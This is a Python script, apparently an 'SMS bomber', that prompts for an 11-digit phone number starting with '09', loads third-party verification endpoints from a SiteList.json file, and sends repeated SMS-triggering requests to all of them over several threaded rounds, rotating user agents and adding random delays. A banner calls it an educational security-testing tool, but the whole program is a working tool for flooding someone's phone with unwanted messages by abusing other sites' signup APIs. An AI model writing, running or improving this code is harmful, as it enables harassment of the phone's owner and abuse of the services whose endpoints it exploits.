import requests
import time
import json
import random
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.progress import track
from rich.table import Table

# Console setup
console = Console()

# User agents for random headers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (Android 11; Mobile)"
]

# Logging setup
logging.basicConfig(
    filename='sms_test.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def get_random_headers():
    return {
        'User-Agent': random.choice(user_agents),
        'Content-Type': 'application/json'
    }

def validate_phone(phone):
    if not phone.startswith("09") or len(phone) != 11 or not phone.isdigit():
        console.print("[bold red]Invalid phone number. It must start with '09' and be 11 digits.[/bold red]")
        return False
    return True

def load_services():
    try:
        with open('SiteList.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        console.print("[bold red]Error: SiteList.json file not found![/bold red]")
        return []

def send_sms(service, phone):
    if service.get("is_get"):
        try:
            res = requests.get(service["url"] + phone, headers=get_random_headers(), timeout=10)
            status = res.status_code == 200
            log_entry(service["name"], "success" if status else "failed")
            return status
        except requests.exceptions.RequestException as e:
            log_entry(service["name"], f"error: {str(e)}")
            return False

    json_data = {service["json_key"]: phone}
    if service.get("extra_json"):
        json_data.update(service["extra_json"])

    try:
        res = requests.post(service["url"], json=json_data, headers=get_random_headers(), timeout=10)
        status = res.status_code == 200
        log_entry(service["name"], "success" if status else f"failed (status: {res.status_code})")
        return status
    except requests.exceptions.RequestException as e:
        log_entry(service["name"], f"error: {str(e)}")
        return False

def log_entry(service_name, status):
    logging.info(f"Service: {service_name}, Status: {status}")
    if "success" in status:
        console.print(f"[green]✔ {service_name} Success[/green]")
    elif "error" in status:
        console.print(f"[yellow]⚠ {service_name} Error: {status.split(': ')[1]}[/yellow]")
    else:
        console.print(f"[red]✘ {service_name} Failed[/red]")

def save_report(data):
    now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"sms_report_{now}.json"
    with open(filename, "w") as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    return filename

def show_summary(success, failed, errors):
    table = Table(title="📊 Final Report", title_style="bold green")
    table.add_column("Status", justify="center", style="cyan")
    table.add_column("Count", justify="center", style="magenta")
    table.add_row("✅ Success", str(success))
    table.add_row("❌ Failed", str(failed))
    table.add_row("⚠ Error", str(errors))
    console.print(table)

def main():
    console.print(Panel("[bold red]⚠ Legal Warning: This tool is for educational and security testing purposes only. Unauthorized use is illegal![/bold red]"))

    phone = Prompt.ask("[bold cyan]Enter mobile number (example: 09121234567)[/bold cyan]")
    if not validate_phone(phone):
        return

    rounds = int(Prompt.ask("[bold cyan]Enter number of rounds to send to each service[/bold cyan]", default="2"))

    services = load_services()
    if not services:
        return

    console.print(Panel(f"[bold green]Starting SMS test to {phone} with {len(services)} services in {rounds} rounds[/bold green]"))
    logging.info(f"Starting SMS test to {phone} with {len(services)} services in {rounds} rounds")

    success = 0
    failed = 0
    error = 0
    report_log = []

    for round_num in track(range(1, rounds + 1), description="[yellow]Running test...[/yellow]"):
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(send_sms, service, phone): service for service in services}
            for future in futures:
                service = futures[future]
                try:
                    result = future.result()
                    entry = {
                        "round": round_num,
                        "service": service["name"],
                        "status": "success" if result else "failed",
                        "time": datetime.now().isoformat()
                    }
                    report_log.append(entry)
                    if result:
                        success += 1
                    else:
                        failed += 1
                except Exception as e:
                    error += 1
                    report_log.append({
                        "round": round_num,
                        "service": service["name"],
                        "status": f"error: {str(e)}",
                        "time": datetime.now().isoformat()
                    })
        time.sleep(random.uniform(1, 3))

    show_summary(success, failed, error)
    filename = save_report(report_log)
    console.print(f"[bold yellow]📁 Report saved to file: [green]{filename}[/green][/bold yellow]")

if __name__ == "__main__":
    main()